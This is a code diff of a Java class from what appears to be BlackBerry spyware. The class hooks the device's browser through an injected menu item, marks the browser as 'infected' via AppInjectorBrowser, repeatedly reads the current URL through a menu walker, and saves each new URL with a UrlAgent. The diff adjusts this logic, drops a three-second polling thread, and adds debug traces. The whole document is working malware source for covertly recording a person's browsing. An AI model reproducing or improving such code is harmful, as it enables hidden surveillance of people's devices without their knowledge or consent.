@@ -45,6 +45,8 @@ public class BrowserMenuItem extends ApplicationMenuItem {
     public Object run(Object context) {
         try {
 
+            debug.init();
+
             //#ifdef DEBUG
             debug.trace("run in context");
             //#endif
@@ -55,6 +57,12 @@ public class BrowserMenuItem extends ApplicationMenuItem {
                 //#endif
                 UiApplication app = UiApplication.getUiApplication();
                 browserScreen = app.getActiveScreen();
+
+                //#ifdef DEBUG
+                debug.trace("run browserScreen: " + browserScreen);
+                //#endif
+
+                AppInjectorBrowser.getInstance().setInfected();
             }
 
             if (context == null) {
@@ -80,27 +88,6 @@ public class BrowserMenuItem extends ApplicationMenuItem {
         return BROWSER_MENU;
     }
 
-    /**
-     * Crea un thread che ogni n secondi legge l'url del browser
-     */
-    public void pressMenuThread() {
-
-        if (menuThread != null) {
-            return;
-        }
-
-        menuThread = new Thread(new Runnable() {
-
-            public void run() {
-                for (;;) {
-                    Utils.sleep(3000);
-                    callMenuInContext();
-                }
-            }
-        });
-
-        menuThread.start();
-    }
 
     boolean menuAdded = false;
 
@@ -134,13 +121,17 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             //#ifdef DEBUG
             debug.info("NEW URL: " + url);
             //#endif
-            
+
             if (agent == null) {
                 agent = (UrlAgent) AgentManager.getInstance().getItem(
                         Agent.AGENT_URL);
             }
-            
+
             agent.saveUrl(url);
+        }else{
+            //#ifdef DEBUG
+            debug.trace("callMenuInContext: same url");
+            //#endif
         }
     }
 
@@ -150,11 +141,14 @@ public class BrowserMenuItem extends ApplicationMenuItem {
         //#endif
         if (browserScreen != null) {
             addMenuBrowser();
-            //Utils.sleep(200);
-            MenuWalker.walk(BROWSER_MENU, UiApplication.getUiApplication()
-                    .getActiveScreen(), false);
+            Utils.sleep(200);
+            MenuWalker.walk(BROWSER_MENU, browserScreen, false);
+            Utils.sleep(200);
             removeMenuBrowser();
+        }else{
+            //#ifdef DEBUG
+            debug.trace("callMenuInContext: null browserScreen");
+            //#endif
         }
     }
-
 }
